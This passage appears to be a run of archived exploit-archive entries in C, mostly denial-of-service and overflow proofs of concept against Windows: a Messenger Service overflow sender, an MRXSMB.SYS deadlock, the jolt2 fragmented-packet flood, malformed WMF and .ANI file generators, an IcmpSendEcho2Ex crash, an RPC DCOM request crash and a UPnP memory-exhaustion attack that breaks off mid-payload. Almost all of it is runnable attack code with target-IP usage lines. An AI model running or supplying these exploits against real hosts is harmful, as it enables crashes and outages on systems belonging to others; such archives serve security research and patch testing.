"\x4f\xb6\xe6\xfc" 
"\xff\xff\xff\xff" // 40 : unique id over 16 bytes ? 
"\xff\xff\xff\xff" 
"\xff\xff\xff\xff" 
"\xff\xff\xff\xff" 
"\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00" 
"\x00\x00\xff\xff\xff\xff" 
"\xff\xff\xff\xff" // 74 : fields length 
"\x00\x00"; 
  
unsigned char field_header[] = 
"\xff\xff\xff\xff" // 0 : field length 
"\x00\x00\x00\x00" 
"\xff\xff\xff\xff"; // 8 : field length 
  


int usage(char *name) 
{ 
 printf("Proof of Concept for Windows Messenger Service Overflow..\n"); 
 printf("- Originally By Hanabishi Recca - reccamail.ru\n\n 
<mailto:reccamail.ru\n\n> "); 
 printf("- Ported to linux by VeNoMouS..\n"); 
 printf("- venomgen-x.co.nz\n\n\n <mailto:venomgen-x.co.nz\n\n\n> "); 
  
 printf("example : %s -d yourputtersux -i 10.33.10.4 -s 
n0nlameputer\n",name); 
 printf("\n-d <dest netbios name>\t-i <dest netbios ip>\n"); 
 printf("-s <src netbios name>\n"); 
 return 1; 
} 
  


int main(int argc,char *argv[]) 
{ 
        int i, packet_size, fields_size, s; 
        unsigned char packet[8192]; 
        struct sockaddr_in addr; 
  char from[57],machine[57],c; 
        char body[4096] = "*** MESSAGE ***"; 
  
  if(argc <= 2) 
  { 
  usage(argv[0]); 
  exit(0); 
  } 
  
    while ((c = getopt (argc, argv, "d:i:s:h")) != EOF) 
  switch(c) 
   { 
   case 'd': 
      strncpy(machine,optarg,sizeof(machine)); 
      printf("Machine is %s\n",machine); 
      break; 
   case 'i': 
            memset(&addr, 0,sizeof(addr)); 
            addr.sin_family = AF_INET; 
            addr.sin_addr.s_addr = inet_addr(optarg); 
            addr.sin_port = htons(135); 
      break; 
   case 's': 
            strncpy(from,optarg,sizeof(from)); 
      break; 
  
   case 'h': 
      usage(argv[0]); 
      exit(0); 
      break; 
   } 
       
        // A few conditions : 
        // 0 <= strlen(from) + strlen(machine) <= 56 
        // max fields size 3992 
  
  if(!addr.sin_addr.s_addr) { printf("Ummm MOFO we need a dest IP...\n"); 
exit(0); } 
  
        if(!strlen(machine)) { printf("Ummmm we also need the dest netbios 
name bro...\n"); exit(0); } 
  
  if(!strlen(from)) strcpy(from,"tolazytotype"); 
  
        memset(packet,0, sizeof(packet)); 
        packet_size = 0; 
  
        memcpy(&packet[packet_size], packet_header, sizeof(packet_header) - 
1); 
        packet_size += sizeof(packet_header) - 1; 
  
        i = strlen(from) + 1; 
        *(unsigned int *)(&field_header[0]) = i; 
        *(unsigned int *)(&field_header[8]) = i; 
        memcpy(&packet[packet_size], field_header, sizeof(field_header) - 
1); 
        packet_size += sizeof(field_header) - 1; 
        strcpy(&packet[packet_size], from); 
        packet_size += (((i - 1) >> 2) + 1) << 2; // padded to a multiple of 
4 
  
        i = strlen(machine) + 1; 
        *(unsigned int *)(&field_header[0]) = i; 
        *(unsigned int *)(&field_header[8]) = i; 
        memcpy(&packet[packet_size], field_header, sizeof(field_header) - 
1); 
        packet_size += sizeof(field_header) - 1; 
        strcpy(&packet[packet_size], machine); 
        packet_size += (((i - 1) >> 2) + 1) << 2; // padded to a multiple of 
4 
  
        fprintf(stdout, "Max 'body' size (incl. terminal NULL char) = %d\n", 
3992 - packet_size + sizeof(packet_header) - sizeof(field_header)); 
        memset(body, 0x14, sizeof(body)); 
        body[3992 - packet_size + sizeof(packet_header) - 
sizeof(field_header) - 1] = '\0'; 
  
        i = strlen(body) + 1; 
        *(unsigned int *)(&field_header[0]) = i; 
        *(unsigned int *)(&field_header[8]) = i; 
        memcpy(&packet[packet_size], field_header, sizeof(field_header) - 
1); 
        packet_size += sizeof(field_header) - 1; 
        strcpy(&packet[packet_size], body); 
        packet_size += i; 
  
        fields_size = packet_size - (sizeof(packet_header) - 1); 
        *(unsigned int *)(&packet[40]) = time(NULL); 
        *(unsigned int *)(&packet[74]) = fields_size; 
  
        fprintf(stdout, "Total length of strings = %d\nPacket size = 
%d\nFields size = %d\n", strlen(from) + strlen(machine) + 
strlen(body),packet_size, fields_size); 
  


 if ((s = socket (AF_INET, SOCK_DGRAM, 0)) == -1 ) 
  { 
   perror("Error socket() - "); 
   exit(0); 
  } 
  
        if (sendto(s, packet, packet_size, 0, (struct sockaddr *)&addr, 
sizeof(addr)) == -1) 
  { 
   perror("Error sendto() - "); 
   exit(0); 
  } 
  


        exit(0); 
}

// milw0rm.com [2004-08-08]
source: http://www.securityfocus.com/bid/18357/info

The Microsoft SMB driver is prone to a local denial-of-service vulnerability.

A local attacker can exploit this issue to create processes that cannot be killed in affected operating systems, potentially denying service to legitimate users and other software on affected computers. This may aid the attacker in further attacks.

////////////////////////////////////////////////////////////////////////////////
///////// MRXSMB.SYS NtClose DEADLOCK exploit///////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
//November 19,2005
////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
//ONLY FOR EDUCATION PURPOSES
////////////////////////////////////////////////////////////////////////////////
// Rub�n Santamarta 
// ruben (at) reversemode (dot) com
// http://www.reversemode.com
////////////////////////////////////////////////////////////////////////////////

#include <windows.h>
#include <stdio.h>


#define MAGIC_IOCTL 0x141047


VOID ShowError()
{
 LPVOID lpMsgBuf;
 FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER| FORMAT_MESSAGE_FROM_SYSTEM,
               NULL,
               GetLastError(),
               MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
               (LPTSTR) &lpMsgBuf,
               0,
               NULL);
 MessageBoxA(0,(LPTSTR)lpMsgBuf,"Error",0);
 exit(1);
}


VOID IamAlive()
{
 DWORD i;
 
 for(i=0;i<0x1000;i++)
 {
  Sleep(1000);
  printf("\rI am a Thread and I am alive [%x]",i);
 } 

}


VOID KillMySelf()
{
     
 DWORD junk;
 DWORD *OutBuff;
 DWORD *InBuff;
 BOOL bResult;
 HANDLE hDevice;
 DWORD i;
 
  hDevice = CreateFile("\\\\.\\shadow", FILE_EXECUTE,FILE_SHARE_READ|FILE_SHARE_WRITE,
                      NULL, OPEN_EXISTING, 0, NULL);
                      
  if (hDevice == INVALID_HANDLE_VALUE) ShowError();
  
  OutBuff=(DWORD*)malloc(0x18);
  if(!OutBuff) ShowError();
  
  OutBuff[3]=(DWORD)hDevice;
  
  DeviceIoControl(hDevice,
                  MAGIC_IOCTL,
                  0,0,
                  OutBuff,0x18,
                  &junk,
                  (LPOVERLAPPED)NULL);
  // MAIN THREAD ENDING.
}


int main(int argc, char *argv[])
{
    
 LPTHREAD_START_ROUTINE GoodThread;
 DWORD dwThreadId;
 DWORD bResult;
 GoodThread=(LPTHREAD_START_ROUTINE)IamAlive;
 

  printf("-=[MRXSMB.SYS NtClose Vulnerability POC]=-\n");
  printf("\t(Only for educational purposes)\n");
  printf("..http://www.reversemode.com..\n\n");
  printf("Launching Thread ...");
  
  // PUT YOUR "GOOD" OR "BAD" CODE HERE
  // e.g GoodThread
  CreateThread(NULL,0,GoodThread,0,0,&dwThreadId);  
  
   
  printf("Done\n");
  printf("I am going to dissapear,but I will be with you forever\n");
  printf("(..)\n\n");
  KillMySelf(); // Immortal mode "on" ;)
  
  return(1); 
}/*
 * File:   jolt2.c
 * Author: Phonix <phonix@moocow.org>
 * Date:   23-May-00
 *
 * Description: This is the proof-of-concept code for the
 *              Windows denial-of-serice attack described by
 *              the Razor team (NTBugtraq, 19-May-00)
 *              (MS00-029).  This code causes cpu utilization
 *              to go to 100%.
 *
 * Tested against: Firewall-1
 *
 * Written for: My Linux box.  YMMV.  Deal with it.
 *
 * Thanks: This is standard code.  Ripped from lots of places.  
 *         Insert your name here if you think you wrote some of 
 *         it.  It's a trivial exploit, so I won't take credit  
 *         for anything except putting this file together.      
 */

#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <getopt.h>

struct _pkt
{
  struct iphdr    ip;
  union {
    struct icmphdr  icmp;
    struct udphdr   udp;
  }  proto;
  char data;
} pkt;

int icmplen  = sizeof(struct icmphdr),
    udplen   = sizeof(struct udphdr),
    iplen    = sizeof(struct iphdr),
    spf_sck;

void usage(char *pname)
{
  fprintf (stderr, "Usage: %s [-s src_addr] [-p port] dest_addr\n", pname);
  fprintf (stderr, "Note: UDP used if a port is specified, otherwise ICMP\n");
  exit(0);
}

u_long host_to_ip(char *host_name)
{
  static  u_long ip_bytes;
  struct hostent *res;

  res = gethostbyname(host_name);
  if (res == NULL)
    return (0);
  memcpy(&ip_bytes, res->h_addr, res->h_length);
  return (ip_bytes);
}

void quit(char *reason)
{
  perror(reason);
  close(spf_sck);
  exit(-1);
}

int do_frags (int sck, u_long src_addr, u_long dst_addr, int port)
{
  int     bs, psize;
  unsigned long x;
  struct  sockaddr_in to;

  to.sin_family = AF_INET;
  to.sin_port = 1235;
  to.sin_addr.s_addr = dst_addr;

  if (port)
    psize = iplen + udplen + 1;
  else
    psize = iplen + icmplen + 1;
  memset(&pkt, 0, psize);

  pkt.ip.version = 4;
  pkt.ip.ihl = 5;
  pkt.ip.tot_len = htons(iplen + icmplen) + 40;
  pkt.ip.id = htons(0x455);
  pkt.ip.ttl = 255;
  pkt.ip.protocol = (port ? IPPROTO_UDP : IPPROTO_ICMP);
  pkt.ip.saddr = src_addr;
  pkt.ip.daddr = dst_addr;
  pkt.ip.frag_off = htons (8190);

  if (port)
  {
    pkt.proto.udp.source = htons(port|1235);
    pkt.proto.udp.dest = htons(port);
    pkt.proto.udp.len = htons(9);
    pkt.data = 'a';
  } else {
    pkt.proto.icmp.type = ICMP_ECHO;
    pkt.proto.icmp.code = 0;
    pkt.proto.icmp.checksum = 0;
  }

  while (1) {
    bs = sendto(sck, &pkt, psize, 0, (struct sockaddr *) &to,
              sizeof(struct sockaddr));
  }
  return bs;
}

int main(int argc, char *argv[])
{
  u_long  src_addr, dst_addr;
  int i, bs=1, port=0;
  char hostname[32];

  if (argc < 2)
    usage (argv[0]);

  gethostname (hostname, 32);
  src_addr = host_to_ip(hostname);

  while ((i = getopt (argc, argv, "s:p:h")) != EOF)
  {
    switch (i)
    {
      case 's':
        dst_addr = host_to_ip(optarg);
        if (!dst_addr)
          quit("Bad source address given.");
        break;

      case 'p':
        port = atoi(optarg);
        if ((port <=0) || (port > 65535))
          quit ("Invalid port number given.");
        break;

      case 'h':
      default:
        usage (argv[0]);
    }
  }

  dst_addr = host_to_ip(argv[argc-1]);
  if (!dst_addr)
    quit("Bad destination address given.");

  spf_sck = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  if (!spf_sck)
    quit("socket()");
  if (setsockopt(spf_sck, IPPROTO_IP, IP_HDRINCL, (char *)&bs,
      sizeof(bs)) < 0)
    quit("IP_HDRINCL");

  do_frags (spf_sck, src_addr, dst_addr, port);
}


// milw0rm.com [2000-12-02]
/*
 * MS07-046(GDI32.dll Integer overflow DOS) Proof Of Concept Code
 
 * by Hong Gil-Dong & Chun Woo-Chi

 * Yang yeon(?~1542), Korea
 * "I shall keep clenching my left fist unitl i see the real tao".

 * This POC is only for test. If an application read a malformed wmf 
 * file like this POC, the application will be crashed. If you apply 
 * this code, you can execute an arbitrary code.
 *

 * We tested this code on Windows XP SP2 Korean Edition 
 * (GDI32.dll version 5.1.2600.3099). But it will work well on other
 * systems.
 */

#include <stdio.h>
#include <windows.h>

#define WMF_FILE "ms07-046.wmf"

void usage(void);

int main()
{
	
	FILE *fp;

	char wmf[] = "\x01\x00\x09\x00\x00\x03\x11\x00\x00\x00\x00\x00"\
                 "\x05\x00\x00\x00\x00\x00\xFF\xFF\xFF\xFF\x13\x02"\
                 "\x32\x00\x96\x00\x03\x00\x00\x00\x00\x00";
	int i;
	
	HMETAFILE srcMeta;

    usage();

	if ((fp = fopen(WMF_FILE, "w")) == NULL) {
                printf("File %s write error\n", WMF_FILE);
                return 0;
	}

	for(i=0; i<sizeof(wmf)-1; i++)
		fputc(wmf[i], fp);

	fclose(fp);

    srcMeta = GetMetaFile(WMF_FILE);
    CopyMetaFile( srcMeta, NULL);

    return 0;
}

void usage(void) 
{
   printf("MS07-046 Windows Meta File RecordParms Integer Overflow \n");
   printf("Proof of Concept by Hong Gil-Dong & Chun Woo-Chi \n");
      
}

// milw0rm.com [2007-08-29]
/*
Microsoft Windows DoS (IcmpSendEcho2Ex interrupting)
Author: l3D
Sites: http://nullbyte.org.il, http://forums.hacking.org.il
IRC: irc://irc.nix.co.il/#security
Email: pupipup33@gmail.com
Tested on Windows 7

Microsoft Windows operating system is prone to a local DoS by interrupting the function IcmpSendEcho2Ex.
The IP address argument should be a non-exist IP address on the net, so the function will wait longer time.
*/
#include <stdio.h>
#include <windows.h>
#include <iphlpapi.h>
#include <winsock2.h>

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")

#define PARAM 0xDEADBEEF

void Terminate(HANDLE hProcess){
     Sleep(150);
     TerminateProcess(hProcess, -1);
}

int main(int argc, char **argv){
    if( argc<2){
        printf("Usage: %s <ip address>\n", argv[0]);
        return 1;
    }
    
    if( IsDebuggerPresent()){
        HANDLE iphlpapi=LoadLibrary("iphlpapi.dll");
        if( !iphlpapi){
            perror("iphlpapi.dll");
            return 1;
        }
        FARPROC IcmpSendEcho=GetProcAddress(iphlpapi, "IcmpSendEcho");
        FARPROC IcmpCreateFile=GetProcAddress(iphlpapi, "IcmpCreateFile");
        FARPROC IcmpCloseHandle=GetProcAddress(iphlpapi, "IcmpCloseHandle");
        if( (IcmpSendEcho && IcmpCreateFile && IcmpCloseHandle)==0){
            perror("icmp functions");
            return 1;
        }
        
        unsigned long ipaddr=INADDR_NONE, params[2];
        HANDLE hIcmpFile;
        char data[32], *reply;
        int replySize=sizeof(ICMP_ECHO_REPLY)+sizeof(data);
        
        if( (ipaddr=inet_addr(argv[1]))==INADDR_NONE){
            perror("Illegal IP address!");
            return 1;
        }
        
        if( (hIcmpFile=(HANDLE)IcmpCreateFile())==INVALID_HANDLE_VALUE){
            perror("IcmpCreateFile");
            return 1;
        }
        
        reply=(char *)malloc(replySize);
        ZeroMemory(data, sizeof(data));
        params[0]=PARAM;
        params[1]=(unsigned long)GetProcAddress(iphlpapi, "IcmpSendEcho2Ex");
        
        RaiseException(EXCEPTION_BREAKPOINT, 0, 2, params);
        puts("Exception raised!");
        IcmpSendEcho(hIcmpFile, ipaddr, data, sizeof(data), NULL, reply, replySize, 1000);
        puts("This line should never be shown...");
        IcmpCloseHandle(hIcmpFile);
        return 0;
    }
    
    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    HANDLE hProcess, hThread;
    DEBUG_EVENT debugEvent;
    EXCEPTION_RECORD *ExceptionRecord=&debugEvent.u.Exception.ExceptionRecord;
    CONTEXT context;
    FARPROC IcmpSendEcho2Ex=NULL;
    char path[256], args[512], originalByte[1];
    
    ZeroMemory(π, sizeof(PROCESS_INFORMATION));
    ZeroMemory(&si, sizeof(STARTUPINFO));
    ZeroMemory(&debugEvent, sizeof(DEBUG_EVENT));
    ZeroMemory(&context, sizeof(CONTEXT));
    ZeroMemory(path, sizeof(path));
    ZeroMemory(args, sizeof(args));
    si.cb=sizeof(STARTUPINFO);
    si.dwFlags=STARTF_USESHOWWINDOW;
    si.wShowWindow=SW_HIDE;
    context.ContextFlags=CONTEXT_FULL | CONTEXT_DEBUG_REGISTERS;
    
    GetModuleFileName(NULL, path, sizeof(path)-1);
    snprintf(args, sizeof(args)-1, "%s %s", path, argv[1]);
    
    if( !CreateProcess(
        NULL,
        args,
        NULL,
        NULL,
        FALSE,
        DEBUG_PROCESS,
        NULL,
        NULL,
        &si,
        π
    )){
       perror("CreateProcess");
       return 1;
    }
    
    if( (hProcess=OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId))==NULL){
       perror("OpenProcess");
       return 1;
    }
    
    HANDLE kernel32=LoadLibrary("kernel32.dll");
    FARPROC DebugSetProcessKillOnExit=GetProcAddress(kernel32, "DebugSetProcessKillOnExit");
    FARPROC DebugActiveProcessStop=GetProcAddress(kernel32, "DebugActiveProcessStop");
    FARPROC OpenThread=GetProcAddress(kernel32, "OpenThread");
    CloseHandle(kernel32);
    DebugSetProcessKillOnExit(TRUE);
    
    while(WaitForDebugEvent(&debugEvent, INFINITE) && debugEvent.dwDebugEventCode!=EXIT_PROCESS_DEBUG_EVENT){
             if( debugEvent.dwDebugEventCode==EXCEPTION_DEBUG_EVENT && ExceptionRecord->ExceptionCode==EXCEPTION_BREAKPOINT){
                 if( ExceptionRecord->NumberParameters>1 && ExceptionRecord->ExceptionInformation[0]==PARAM){
                     IcmpSendEcho2Ex=(FARPROC)ExceptionRecord->ExceptionInformation[1];
                     printf("IcmpSendEcho2Ex %p\n", IcmpSendEcho2Ex);
                     if( !BreakpointSet(hProcess, IcmpSendEcho2Ex, &originalByte)){
                         perror("BreakpointSet");
                         break;
                     }
                 }
                 else if( ExceptionRecord->ExceptionAddress==IcmpSendEcho2Ex){
                      printf("EIP %p\n", IcmpSendEcho2Ex);
                      if( !BreakpointRetrieve(hProcess, IcmpSendEcho2Ex, &originalByte)){
                          perror("BreakpointRetrieve");
                          break;
                      }
                      if((hThread=(HANDLE)OpenThread(THREAD_ALL_ACCESS, FALSE, debugEvent.dwThreadId))==NULL) puts("OpenThread");
                      if(!GetThreadContext(hThread, &context)) puts("GetThreadContext");
                      context.Eip -= 1;
                      if(!SetThreadContext(hThread, &context)) puts("SetThreadContext");
                      CreateThread(NULL, 0, (void *)Terminate, hProcess, 0, NULL);
                 }
             }
             else if( debugEvent.dwDebugEventCode==EXCEPTION_DEBUG_EVENT){
                  puts("Exception!");
                  DebugActiveProcessStop(debugEvent.dwProcessId);
                  break;
             }
             ContinueDebugEvent(debugEvent.dwProcessId, debugEvent.dwThreadId, DBG_CONTINUE);
             ZeroMemory(&debugEvent, sizeof(DEBUG_EVENT));
    }
    
    return 0;
}

BOOL BreakpointSet(HANDLE hProcess, void *addr, char *originalByte){
     unsigned long oldProtect;
     if(
     VirtualProtectEx(hProcess, addr, 1, PAGE_EXECUTE_READWRITE, &oldProtect) &&
     ReadProcessMemory(hProcess, addr, originalByte, 1, NULL) &&
     WriteProcessMemory(hProcess, addr, "\xCC", 1, NULL) &&
     VirtualProtectEx(hProcess, addr, 1, oldProtect, &oldProtect))
     return TRUE;
     else return FALSE;
}

BOOL BreakpointRetrieve(HANDLE hProcess, void *addr, char *originalByte){
     unsigned long oldProtect;
     if(
     VirtualProtectEx(hProcess, addr, 1, PAGE_EXECUTE_READWRITE, &oldProtect) &&
     WriteProcessMemory(hProcess, addr, originalByte, 1, NULL) &&
     VirtualProtectEx(hProcess, addr, 1, oldProtect, &oldProtect))
     return TRUE;
     else return FALSE;
}
/****************************************************************************
*              MS Windows Explorer Unspecified .ANI File DoS                *
*                                                                           *
*                                                                           *
* Another .Ani bug that freezes Explorer if you open a folder that contains *
* a crafted file.                                                           *
*                                                                           *
* Tested against Win XP SP2 FR.                                             *
* Have Fun!                                                                 *
*                                                                           *
* Coded by Marsu <Marsupilamipowa@hotmail.fr>                               *
****************************************************************************/

#include "stdio.h"
#include "stdlib.h"

unsigned char Ani_headers[] = 
"\x52\x49\x46\x46\x08\x4d\x00\x00\x41\x43\x4f\x4e\x61\x6e\x69\x68"
"\x24\x00\x00\x00\x24\x00\x00\x00\x06\x00\x00\x00\x06\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00"
"\x0a\x00\x00\x00\x01\x00\x00\x00\x72\x61\x74\x65\x18\x00\x00\x00"
"\x03\x00\x00\x00\x03\x00\x00\x00\x03\x00\x00\x00\x03\x00\x00\x00"
"\x03\x00\x00\x00\x03\x00\x00\x00\x4c\x49\x53\x54\xa8\x4c\x00\x00"
"\x66\x72\x61\x6d\x69\x63\x6f\x6e\xbe\x0c\x00\x00\x00\x00\x02\x00"
"\x01\x00\x20\x20\x00\x57\x57\x57\x57\x00\xa8\x0c\x00\x00\x16\x00"
"\x00\x00\x03" //Change this last char to avoid crash
;

int main(int argc, char* argv[])
{
	FILE* anifile;
	char evilbuff[4000];
	printf("[+] MS Windows Explorer Unspecified .ANI File DoS\n");
	printf("[+] Coded by Marsu <Marsupilamipowa@hotmail.fr>\n");
	if (argc!=2) {
		printf("[+] Usage: %s <file.ani>\n",argv[0]);
		return 0;
	}
	
	memset(evilbuff,'A',4000);
	memcpy(evilbuff,Ani_headers,sizeof(Ani_headers)-1);
	
	if ((anifile=fopen(argv[1],"wb"))==0) {
		printf("[-] Unable to access file.\n");
		return 0;
	}
	fwrite( evilbuff, 1, 4000, anifile );
	fclose(anifile);
	printf("[+] Done. Have fun!\n");
	return 0;
	
}

// milw0rm.com [2007-04-08]
// This is a new unpatched vulnerability - NOT the MS03-026

#include <winsock2.h>
#include <stdio.h>
#include <windows.h>
#include <process.h>
#include <string.h>
#include <winbase.h>

unsigned char bindstr[]={
0x05,0x00,0x0B,0x03,0x10,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x7F,0x00,0x00,0x00,
0xD0,0x16,0xD0,0x16,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x01,0x00,
0xA0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,
0x00,0x00,0x00,0x00,0x04,0x5D,0x88,0x8A,0xEB,0x1C,0xC9,0x11,0x9F,0xE8,0x08,0x00,
0x2B,0x10,0x48,0x60,0x02,0x00,0x00,0x00};

unsigned char request[]={
0x05,0x00,0x00,0x03,0x10,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x13,0x00,0x00,0x00,
0x90,0x00,0x00,0x00,0x01,0x00,0x03,0x00,0x05,0x00,0x06,0x01,0x00,0x00,0x00,0x00,
0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,
0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};



void main(int argc,char ** argv)
{
    WSADATA WSAData;
 int i;
    SOCKET sock;
    SOCKADDR_IN addr_in;
 
 short port=135;
 unsigned char buf1[0x1000];
 printf("RPC DCOM DOS Vulnerability discoveried by Xfocus.org\n");
 printf("Code by FlashSky,Flashsky xfocus org,benjurry,benjurry xfocus org\n");
 printf("Welcome to http://www.xfocus.net\n");
 if(argc<2)
 {
  printf("useage:%s target\n",argv[0]);
exit(1);
 }


    if (WSAStartup(MAKEWORD(2,0),&WSAData)!=0)
    {
        printf("WSAStartup error.Error:%d\n",WSAGetLastError());
        return;
    }

    addr_in.sin_family=AF_INET;
    addr_in.sin_port=htons(port);
    addr_in.sin_addr.S_un.S_addr=inet_addr(argv[1]);
 
 if ((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==INVALID_SOCKET)
    {
        printf("Socket failed.Error:%d\n",WSAGetLastError());
        return;
    }
 if(WSAConnect(sock,(struct sockaddr *)&addr_in,sizeof(addr_in),NULL,NULL,NULL,NULL)==SOCKET_ERROR)
 {
  printf("Connect failed.Error:%d",WSAGetLastError());
  return;
 }
 if (send(sock,bindstr,sizeof(bindstr),0)==SOCKET_ERROR)
 {
   printf("Send failed.Error:%d\n",WSAGetLastError());
   return;
 }

 i=recv(sock,buf1,1024,MSG_PEEK);
 if (send(sock,request,sizeof(request),0)==SOCKET_ERROR)
 {
   printf("Send failed.Error:%d\n",WSAGetLastError());
   return;
 }
 i=recv(sock,buf1,1024,MSG_PEEK);
}



// milw0rm.com [2003-07-21]
/* 
 * Author: Winny Thomas
 * 	     Nevis Labs, Pune, INDIA 	
 *
 * Details: 
 * While working on the exploit for MS05-047 i came across a condition where
 * a specially crafted request to upnp_getdevicelist would cause 
 * services.exe to consume memory to a point where the target machines virtual
 * memory gets exhausted. This exploit is NOT similar to the MS05-047 exploit i 
 * published earlier. The earlier one trashed the EIP of the target causing a 
 * crash in services.exe and eventually brought down the system to shut down. 
 * However in this exploit (again a DOS) the virtual memory is consumed to a 
 * point where desktop requests (like clicking "My Computer"), HTTP requests,
 * SMB requests etc does not get serviced for sometime. After sometime the 
 * memory usage comes down and the target system would work as normal. However
 * this code when continuosly executed against a target leads to a sustained 
 * DOS attack.
 * Start the task manager on the target system and run this code against the 
 * target and watch the virtual memory usage shoot up.
 *
 * I used windbg to break on calls to upnp_getdevicelist when running this code.
 * However even before the break point is hit the system becomes unresponsive. 
 * Strangely though changing the operation number in the DCERPC request to 
 * something else other than 0xa (upnp_getdevicelist) will make the DOS attempt
 * fail. Perhaps changing the payload a little bit, so that the underlying 
 * demarshalling routines dont return an error, might reproduce this effect
 * for other UPNP operations as well.
 *
 * TESTED ON: Windows 2000 server SP0, SP2 and SP3. I have not tested this on
 * any of the above machines with the recent hot fixes for UPNP.
 * 
 * Note: This code is for educational/testing purposes by authorized persons on networks systems setup for such purposes 
 * The author shall bear no responsibility for any damage caused by using this code. 
 */

#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

unsigned short ProcessID = 0;
unsigned short TID = 0;
unsigned short UserID = 0;
unsigned short FID = 0;

char peer0_0[] = 
"\x00\x00\x00\x85\xFF\x53\x4D\x42\x72\x00\x00\x00\x00\x18\x53\xC8"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
"\x00\x00\x00\x00\x00\x62\x00\x02\x50\x43\x20\x4E\x45\x54\x57\x4F"
"\x52\x4B\x20\x50\x52\x4F\x47\x52\x41\x4D\x20\x31\x2E\x30\x00\x02"
"\x4C\x41\x4E\x4D\x41\x4E\x31\x2E\x30\x00\x02\x57\x69\x6E\x64\x6F"
"\x77\x73\x20\x66\x6F\x72\x20\x57\x6F\x72\x6B\x67\x72\x6F\x75\x70"
"\x73\x20\x33\x2E\x31\x61\x00\x02\x4C\x4D\x31\x2E\x32\x58\x30\x30"
"\x32\x00\x02\x4C\x41\x4E\x4D\x41\x4E\x32\x2E\x31\x00\x02\x4E\x54"
"\x20\x4C\x4D\x20\x30\x2E\x31\x32\x00" ;

char peer0_1[] = 
"\x00\x00\x00\xA4\xFF\x53\x4D\x42\x73\x00\x00\x00\x00\x18\x07\xC8"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
"\x00\x00\x10\x00\x0C\xFF\x00\xA4\x00\x04\x11\x0A\x00\x00\x00\x00"
"\x00\x00\x00\x20\x00\x00\x00\x00\x00\xD4\x00\x00\x80\x69\x00\x4E"
"\x54\x4C\x4D\x53\x53\x50\x00\x01\x00\x00\x00\x97\x82\x08\xE0\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x57\x00\x69\x00\x6E\x00\x64\x00\x6F\x00\x77\x00\x73\x00\x20\x00"
"\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00\x32\x00\x31\x00\x39\x00"
"\x35\x00\x00\x00\x57\x00\x69\x00\x6E\x00\x64\x00\x6F\x00\x77\x00"
"\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00\x35\x00"
"\x2E\x00\x30\x00\x00\x00\x00\x00";

char peer0_1_2[] = 
"\x00\x00\x00\xDA\xFF\x53\x4D\x42\x73\x00\x00\x00\x00\x18\x07\xC8"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
"\x00\x08\x20\x00\x0C\xFF\x00\xDA\x00\x04\x11\x0A\x00\x00\x00\x00"
"\x00\x00\x00\x57\x00\x00\x00\x00\x00\xD4\x00\x00\x80\x9F\x00\x4E"
"\x54\x4C\x4D\x53\x53\x50\x00\x03\x00\x00\x00\x01\x00\x01\x00\x46"
"\x00\x00\x00\x00\x00\x00\x00\x47\x00\x00\x00\x00\x00\x00\x00\x40"
"\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x06\x00\x06\x00\x40"
"\x00\x00\x00\x10\x00\x10\x00\x47\x00\x00\x00\x15\x8A\x88\xE0\x48"
"\x00\x4F\x00\x44\x00\x00\xED\x41\x2C\x27\x86\x26\xD2\x59\xA0\xB3"
"\x5E\xAA\x00\x88\x6F\xC5\x57\x00\x69\x00\x6E\x00\x64\x00\x6F\x00"
"\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00"
"\x32\x00\x31\x00\x39\x00\x35\x00\x00\x00\x57\x00\x69\x00\x6E\x00"
"\x64\x00\x6F\x00\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00"
"\x30\x00\x20\x00\x35\x00\x2E\x00\x30\x00\x00\x00\x00\x00";

char peer0_2[] = 
"\x00\x00\x00\x58\xFF\x53\x4D\x42\x75\x00\x00\x00\x00\x18\x07\xC8"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
"\x00\x08\x30\x00\x04\xFF\x00\x5A\x00\x08\x00\x01\x00\x2D\x00\x00";

char peer0_3[] = 
"\x00\x00\x00\x66\xff\x53\x4d\x42\xa2\x00\x00\x00\x00\x18\x07\xc8"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xfe"
